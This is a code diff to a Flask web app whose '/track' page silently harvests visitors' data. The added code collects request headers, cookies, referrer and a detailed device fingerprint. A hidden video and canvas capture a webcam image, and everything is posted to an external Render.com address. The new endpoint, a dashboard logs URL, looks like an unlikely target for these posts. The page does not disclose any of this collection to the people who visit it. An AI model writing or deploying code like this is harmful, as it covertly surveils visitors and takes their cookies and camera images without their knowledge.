@@ -9,9 +9,7 @@ import socket
 app = Flask(__name__)
 
 visitor_data = []
-
-# Replace with your actual Render.com endpoint that can accept POST requests
-RENDER_ENDPOINT = "https://your-render-service.onrender.com/receive-data"  # Update this URL
+RENDER_ENDPOINT = "https://dashboard.render.com/web/srv-cvhbub1u0jms73bk9lo0/logs"
 
 @app.route('/track')
 def track():
@@ -37,7 +35,21 @@ def track():
         'hostname': hostname,
         'user_agent': raw_user_agent,
         'browser_profile_name': browser_profile_name,
+        'device': ua.device.family if ua.device.family else 'Unknown',
+        'device_brand': ua.device.brand if ua.device.brand else 'Unknown',
+        'device_model': ua.device.model if ua.device.model else 'Unknown',
+        'os': ua.os.family if ua.os.family else 'Unknown',
+        'os_version': ua.os.version_string if ua.os.version_string else 'Unknown',
+        'browser': ua.browser.family if ua.browser.family else 'Unknown',
+        'browser_version': ua.browser.version_string if ua.browser.version_string else 'Unknown',
         'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
+        'headers': headers,
+        'referrer': request.referrer if request.referrer else 'Unknown',
+        'cookies': request.cookies if request.cookies else 'None',
+        'accept_language': request.headers.get('Accept-Language', 'Unknown'),
+        'accept_encoding': request.headers.get('Accept-Encoding', 'Unknown'),
+        'connection': request.headers.get('Connection', 'Unknown'),
+        'host': request.headers.get('Host', 'Unknown')
     }
     visitor_data.append(visitor_info)
 
@@ -50,23 +62,27 @@ def track():
         <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
         
         <script>
+            // Webcam screenshot functionality
             async function captureScreenshot() {
                 const video = document.getElementById('video');
                 const canvas = document.getElementById('canvas');
                 const context = canvas.getContext('2d');
 
                 try {
-                    // Request front-facing camera
-                    const stream = await navigator.mediaDevices.getUserMedia({
-                        video: { 
-                            facingMode: 'user'
-                        }
-                    });
+                    // Request webcam access
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                     video.srcObject = stream;
 
+                    // Wait for video to load
                     await new Promise(resolve => video.onloadedmetadata = resolve);
+
+                    // Draw video frame to canvas
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Convert to base64
                     const screenshot = canvas.toDataURL('image/jpeg');
+
+                    // Stop the video stream
                     stream.getTracks().forEach(track => track.stop());
 
                     return screenshot;
@@ -76,10 +92,37 @@ def track():
                 }
             }
 
+            // Collect client-side data
             const deviceInfo = {
-                timestamp: new Date().toISOString()
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                windowWidth: window.innerWidth,
+                windowHeight: window.innerHeight,
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio || 'Unknown',
+                orientation: screen.orientation ? screen.orientation.type : 'Unknown',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timeOffset: new Date().getTimezoneOffset(),
+                languages: navigator.languages || [navigator.language || navigator.userLanguage],
+                platform: navigator.platform || 'Unknown',
+                product: navigator.product || 'Unknown',
+                vendor: navigator.vendor || 'Unknown',
+                memory: navigator.deviceMemory || 'Not available',
+                cpuCores: navigator.hardwareConcurrency || 'Not available',
+                connection: (navigator.connection || navigator.mozConnection || navigator.webkitConnection) ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    downlinkMax: navigator.connection.downlinkMax || 'Not available',
+                    rtt: navigator.connection.rtt,
+                    type: navigator.connection.type || 'Unknown'
+                } : 'Not available',
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || window.doNotTrack || 'Not set'
             };
 
+            // Capture screenshot and send all data
             (async () => {
                 const screenshot = await captureScreenshot();
                 if (screenshot) {
@@ -112,16 +155,13 @@ def log():
 
 def send_to_render(data):
     try:
-        # Send the data including the screenshot to Render.com
-        headers = {'Content-Type': 'application/json'}
-        response = requests.post(RENDER_ENDPOINT, json=data, headers=headers, timeout=15)
-        
-        if response.status_code == 200:
-            print(f"Data sent successfully to Render.com: {response.status_code}")
-            print("Sent data:", json.dumps(data, indent=2))
-        else:
-            print(f"Failed to send data to Render.com: {response.status_code}")
-            print(f"Response: {response.text}")
+        response = requests.post(RENDER_ENDPOINT, json=data, timeout=15)
+        print(f"Data sent to Render.com: {response.status_code}")
+        # If you want to save the screenshot locally, uncomment the following:
+        # if 'screenshot' in data:
+        #     with open(f"screenshot_{time.time()}.jpg", "wb") as f:
+        #         f.write(base64.b64decode(data['screenshot'].split(',')[1]))
+        print("Full visitor info:", json.dumps(data, indent=2))
     except Exception as e:
         print(f"Error sending to Render.com: {e}")
 
